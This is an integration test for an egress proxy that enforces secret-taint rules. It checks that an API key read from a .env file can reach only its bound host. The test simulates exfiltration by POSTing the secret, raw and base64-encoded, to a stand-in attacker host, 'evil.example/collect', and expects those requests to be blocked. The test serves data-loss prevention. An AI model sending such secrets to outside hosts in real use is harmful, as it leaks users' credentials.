/**
 * https-taint-parity — plan 13 D6 over the PRODUCTION wiring: a real
 * NetProxy (TLS inspection on) over a REAL ArbiterServer through the
 * production adapter (`new ArbiterClientAdapter(new ArbiterClient(sock),
 * new ArbiterClient(humanSock))`; the holder chains ride the human client
 * since the plan 13 D9 leftovers, 2026-10-02), so the two ops the HTTPS legs forward — `taintedProcessBindings` with the
 * holder's ancestors, and the new `sessionSecretTaint` — are proven on the
 * wire, not only against the mock (CONTRIBUTING.md, the arbiter-client pattern).
 *
 * The arbiter's policy labels a `.env` `no-model`, bound to
 * `bound.example`, read by `sh`; a real `decideSecretOpen` records the raw
 * read for process `4100-1` in session `sess-p`. The proxy's attribution is
 * injected: the sender is `4101-2`, a child of the reader (its edge exists
 * only through the ancestor chain the proxy passes). Mock-sites host routes
 * send `bound.example` and `evil.example` to two loopback HTTPS listeners
 * that record every request. Asserted, with the listeners as the oracle:
 * the child's HTTPS request reaches the bound host and not the unbound one
 * (raw or base64), an unattributed connection is refused in the session
 * holding the secret and forwarded in a session holding none.
 *
 * Axes are explicit server options (secrets: confidentiality ON, integrity
 * OFF). Mandu-new (no reference origin).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer as createHttpsServer } from "node:https";
import { connect as tlsConnect } from "node:tls";
import { connect as netConnect, type AddressInfo } from "node:net";
import { once } from "node:events";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { NetProxy } from "../../src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../src/arbiter-client.js";
import { MockSites } from "../../src/mock-sites.js";
import { ensureCa, leafForHost, opensslAvailable } from "../../src/ca.js";
import type { ProcHolder } from "../../src/conn-attr.js";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const OPENSSL = opensslAvailable();
const SECRET = "sk_live_D6PARITY_0c81e2f4aa";

/** An HTTPS listener for `host` under a test CA, recording every request. */
async function listener(dir: string, host: string) {
  const ca = ensureCa(join(dir, `ca-${host}`));
  const leaf = leafForHost(ca, host);
  const got: string[] = [];
  const server = createHttpsServer({ key: leaf.keyPem, cert: leaf.certPem }, (req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      got.push(`${req.url} ${Buffer.concat(chunks).toString("utf8")}`);
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok");
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  return { got, port: (server.address() as AddressInfo).port, caPath: ca.certPath, close: () => server.close() };
}

/** CONNECT host:443 through the proxy, TLS trusting the session CA, one POST. */
function post(proxyPort: number, host: string, sessionCa: string, body: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const raw = netConnect(proxyPort, "127.0.0.1", () => raw.write(`CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}:443\r\n\r\n`));
    let head = Buffer.alloc(0);
    const onData = (c: Buffer): void => {
      head = Buffer.concat([head, c]);
      const idx = head.indexOf("\r\n\r\n");
      if (idx === -1) return;
      raw.off("data", onData);
      const status = head.subarray(0, idx).toString("latin1").split("\r\n")[0]!;
      if (!/ 200 /.test(`${status} `)) {
        raw.destroy();
        resolve(Number(/HTTP\/1\.1 (\d{3})/.exec(status)?.[1] ?? 0));
        return;
      }
      const tls = tlsConnect({ socket: raw, servername: host, ca: sessionCa }, () => {
        tls.write(`POST /collect HTTP/1.1\r\nHost: ${host}\r\nContent-Type: text/plain\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`);
      });
      const left = head.subarray(idx + 4);
      if (left.length) tls.unshift(left);
      const chunks: Buffer[] = [];
      tls.on("data", (d: Buffer) => chunks.push(d));
      tls.on("end", () => resolve(Number(/^HTTP\/1\.1 (\d{3})/.exec(Buffer.concat(chunks).toString("utf8"))?.[1] ?? 0)));
      tls.on("error", reject);
    };
    raw.on("data", onData);
    raw.on("error", reject);
    setTimeout(() => reject(new Error("post timed out")), 8000).unref();
  });
}

test("D6 parity: the production adapter carries the holder's ancestors and the session question; a reader's child reaches its bound host only, an unattributed sender is refused in the holding session", { skip: !OPENSSL && "openssl unavailable", timeout: 60_000 }, async () => {
  const { ArbiterServer } = (await import(join(REPO, "arbiter/ipc/server.ts"))) as {
    ArbiterServer: new (o: Record<string, unknown>) => { listen(): Promise<void>; close(): Promise<void> };
  };
  const { ArbiterClient } = (await import(join(REPO, "arbiter/ipc/client.ts"))) as {
    ArbiterClient: new (path: string) => RealArbiterClient & {
      connect(): Promise<void>;
      close(): void;
      registerSecret(a: { path: string }): Promise<{ symbol: string | null; reason: string }>;
      decideSecretOpen(a: { path: string; exe: string; isAgent: boolean; exeSystem?: boolean; openerEnv?: string[]; procKey: string; session?: string }): Promise<{ verdict: string }>;
    };
  };
  const dir = mkdtempSync(join(tmpdir(), "mdu-np-d6-"));
  const envFile = join(dir, ".env");
  writeFileSync(envFile, `API_KEY=${SECRET}\n`);
  const sock = join(dir, "arbiter.sock");
  const server = new ArbiterServer({
    socketPath: sock, humanSocketPath: join(dir, "human", "h.sock"), dbPath: join(dir, "db.sqlite"), eventDir: join(dir, "events"), log: () => {},
    adminPolicyDir: null, packDir: null, confidentiality: true, integrity: false,
    policyDocument: { version: 1, paths: [{ path: envFile, level: "no-model", bindings: ["bound.example"], readers: ["ssh-add"] }] },
  });
  await server.listen();
  const data = new ArbiterClient(sock);
  await data.connect();
  // The guard reports on the human socket, where its raw opens are believed
  // (plan 13 D9); the net-proxy sends its holder chains there too (the D9
  // leftovers), its other questions on the data socket.
  const guard = new ArbiterClient(join(dir, "human", "h.sock"));
  await guard.connect();
  const human = new ArbiterClient(join(dir, "human", "h.sock"));
  const bound = await listener(dir, "bound.example");
  const evil = await listener(dir, "evil.example");
  const sites = MockSites.fromYaml([
    "hosts:",
    "  - host: bound.example", `    tls_to: 127.0.0.1:${bound.port}`, `    tls_ca: ${JSON.stringify(bound.caPath)}`,
    "  - host: evil.example", `    tls_to: 127.0.0.1:${evil.port}`, `    tls_ca: ${JSON.stringify(evil.caPath)}`,
    "",
  ].join("\n"));
  let holders: ProcHolder[] = [];
  const proxies: NetProxy[] = [];
  const start = async (sessionId: string): Promise<{ port: number; ca: string }> => {
    const caDir = join(dir, `mitm-${sessionId}`);
    const proxy = new NetProxy({ allowThisMachine: true,
      arbiter: new ArbiterClientAdapter(data, human), log: () => {}, sessionId, mockSites: sites, mitm: { caDir },
      attributeHolders: () => holders,
    });
    proxies.push(proxy);
    const port = await proxy.listen(0);
    return { port, ca: readFileSync(join(caDir, "mandu-egress-ca.pem"), "utf8") };
  };
  try {
    assert.ok((await data.registerSecret({ path: envFile })).symbol);
    assert.equal((await guard.decideSecretOpen({ path: envFile, exe: "/usr/bin/ssh-add", isAgent: false, exeSystem: true, openerEnv: [], procKey: "4100-1", session: "sess-p" })).verdict, "raw");

    const p = await start("sess-p");
    // The reader's child: its only link to the reader is the chain the proxy passes.
    holders = [{ procKey: "4101-2", ancestors: ["4100-1"] }];
    assert.equal(await post(p.port, "evil.example", p.ca, `k=${SECRET}`), 403, "a holder → an unbound host");
    assert.equal(await post(p.port, "evil.example", p.ca, `k=${Buffer.from(SECRET).toString("base64")}`), 403, "encoded");
    assert.equal(await post(p.port, "bound.example", p.ca, `k=${SECRET}`), 200, "the bound host");
    assert.deepEqual(bound.got, [`/collect k=${SECRET}`]);

    // Unattributed: refused in the session that holds the secret …
    holders = [];
    assert.equal(await post(p.port, "evil.example", p.ca, "hello=1"), 403, "an unattributed sender in the holding session");
    // … and forwarded in a session where nothing was read raw.
    const q = await start("sess-q");
    assert.equal(await post(q.port, "evil.example", q.ca, "hello=1"), 200, "an unattributed sender in a clean session");

    // THE ORACLE: the unbound host never saw the secret, in any form.
    assert.deepEqual(evil.got, ["/collect hello=1"]);
    assert.ok(!evil.got.join("\n").includes(SECRET) && !evil.got.join("\n").includes(Buffer.from(SECRET).toString("base64")));
  } finally {
    for (const px of proxies) await px.close();
    bound.close();
    evil.close();
    data.close();
    human.close();
    guard.close();
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
